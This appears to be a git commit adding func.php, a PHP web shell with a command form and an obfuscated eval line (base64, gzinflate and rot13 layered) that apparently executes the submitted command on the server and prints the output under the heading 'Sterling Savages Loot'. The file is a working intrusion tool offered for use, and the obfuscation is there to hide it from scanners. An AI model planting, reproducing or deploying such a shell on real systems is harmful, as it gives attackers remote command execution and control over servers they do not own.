f13e8c5549bf45e35e2855140dcffc75290e767e
HoaSec <37164935+HoaSec@users.noreply.github.com>
2023-12-11 19:37:58 -0500

    Add files via upload

---
+++ func.php
@@ -0,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Web Shell</title>
+    <style>
+        * {
+            -webkit-box-sizing: border-box;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: sans-serif;
+            color: rgba(0, 0, 0, .75);
+        }
+
+        main {
+            margin: auto;
+            max-width: 850px;
+        }
+
+        pre,
+        input,
+        button {
+            padding: 10px;
+            border-radius: 5px;
+            background-color: #efefef;
+        }
+
+        label {
+            display: block;
+        }
+
+        input {
+            width: 100%;
+            background-color: #efefef;
+            border: 2px solid transparent;
+        }
+
+        input:focus {
+            outline: none;
+            background: transparent;
+            border: 2px solid #e6e6e6;
+        }
+
+        button {
+            border: none;
+            cursor: pointer;
+            margin-left: 5px;
+        }
+
+        button:hover {
+            background-color: #e6e6e6;
+        }
+
+        .form-group {
+            display: -webkit-box;
+            display: -ms-flexbox;
+            display: flex;
+            padding: 15px 0;
+        }
+    </style>
+</head>
+
+<?php eval(str_rot13(gzinflate(base64_decode('KytW0FAsqkpOz9FQiQ8Jco9WL1SP1dRUqOZSAAKVQgVbhbTSosrK+KLsogKNtPTU+NSkdENjjZLcssTiyrz0Io38vLQiM5P4wqKCpMIiFEM0Na25agE=')))); ?>
+<body>
+    <main>
+            <h1>Web Shell</h1>
+        <h2>Execute a command</h2>
+
+        <form method="get">
+            <label for="d"><strong>Command</strong></label>
+            <div class="form-group">
+                <input type="text" name="d" id="d" value="<?= htmlspecialchars($get['d'], ENT_QUOTES, 'UTF-8') ?>"
+                       onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required>
+                <button type="submit">Execute</button>
+            </div>
+        </form>
+
+            <h2>Sterling Savages Loot</h2>
+            <?php if (isset($d)): ?>
+                <pre><?= htmlspecialchars($d, ENT_QUOTES, 'UTF-8') ?></pre>
+            <?php else: ?>
+                <pre><small>No result.</small></pre>
+        <?php endif; ?>
+    </main>
+</body>
+</html>
